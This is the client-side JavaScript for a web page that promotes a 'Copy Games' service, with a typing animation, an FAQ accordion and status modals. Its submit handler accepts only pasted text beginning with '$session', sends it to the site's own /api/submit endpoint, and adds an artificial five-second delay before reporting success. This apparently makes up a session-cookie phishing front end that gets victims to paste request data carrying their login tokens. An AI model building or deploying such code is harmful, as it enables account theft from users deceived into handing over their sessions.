// Typing animation for hero
const phrases = ['Always Here for You!', 'Copy Games Easily!', 'Fast & Reliable!'];
let phraseIndex = 0;
let charIndex = 0;
let isDeleting = false;
const typedEl = document.getElementById('typed-text');

function typeEffect() {
  const current = phrases[phraseIndex];

  if (!isDeleting) {
    typedEl.textContent = current.substring(0, charIndex + 1);
    charIndex++;

    if (charIndex === current.length) {
      isDeleting = true;
      setTimeout(typeEffect, 2000);
      return;
    }
  } else {
    typedEl.textContent = current.substring(0, charIndex - 1);
    charIndex--;

    if (charIndex === 0) {
      isDeleting = false;
      phraseIndex = (phraseIndex + 1) % phrases.length;
    }
  }

  const speed = isDeleting ? 40 : 80;
  setTimeout(typeEffect, speed);
}

typeEffect();

// FAQ accordion
document.querySelectorAll('.faq-question').forEach((btn) => {
  btn.addEventListener('click', () => {
    const item = btn.parentElement;
    const wasOpen = item.classList.contains('open');

    document.querySelectorAll('.faq-item').forEach((i) => i.classList.remove('open'));

    if (!wasOpen) {
      item.classList.add('open');
    }
  });
});

// Modal logic
const overlay = document.getElementById('overlay');
const modalProcessing = document.getElementById('modal-processing');
const modalSuccess = document.getElementById('modal-success');
const modalInvalid = document.getElementById('modal-invalid');
const modalRatelimit = document.getElementById('modal-ratelimit');
const modalError = document.getElementById('modal-error');
const fileInput = document.getElementById('file-input');
const submitBtn = document.getElementById('submit-btn');

function hideAllModals() {
  modalProcessing.classList.add('hidden');
  modalSuccess.classList.add('hidden');
  modalInvalid.classList.add('hidden');
  modalRatelimit.classList.add('hidden');
  modalError.classList.add('hidden');
}

function showOverlay() {
  overlay.classList.remove('hidden');
}

function hideOverlay() {
  overlay.classList.add('hidden');
  hideAllModals();
}

function showModal(modal) {
  hideAllModals();
  showOverlay();
  modal.classList.remove('hidden');
}

document.querySelectorAll('[data-close]').forEach((btn) => {
  btn.addEventListener('click', hideOverlay);
});

overlay.addEventListener('click', (e) => {
  if (e.target === overlay && modalProcessing.classList.contains('hidden')) {
    hideOverlay();
  }
});

async function handleSubmit() {
  const value = fileInput.value.trim();

  if (!value || !value.startsWith('$session')) {
    showModal(modalInvalid);
    return;
  }

  submitBtn.disabled = true;
  showModal(modalProcessing);
  const start = Date.now();

  try {
    const response = await fetch('/api/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text: value })
    });

    let data = {};
    try {
      data = await response.json();
    } catch {
      data = {};
    }

    if (response.status === 429 || data.error === 'too_many_requests') {
      showModal(modalRatelimit);
      return;
    }

    if (response.status === 400) {
      showModal(modalInvalid);
      return;
    }

    if (!response.ok) {
      showModal(modalError);
      return;
    }

    const elapsed = Date.now() - start;
    if (elapsed < 5000) {
      await new Promise((resolve) => setTimeout(resolve, 5000 - elapsed));
    }

    showModal(modalSuccess);
  } catch {
    showModal(modalError);
  } finally {
    submitBtn.disabled = false;
  }
}

submitBtn.addEventListener('click', handleSubmit);

fileInput.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    handleSubmit();
  }
});
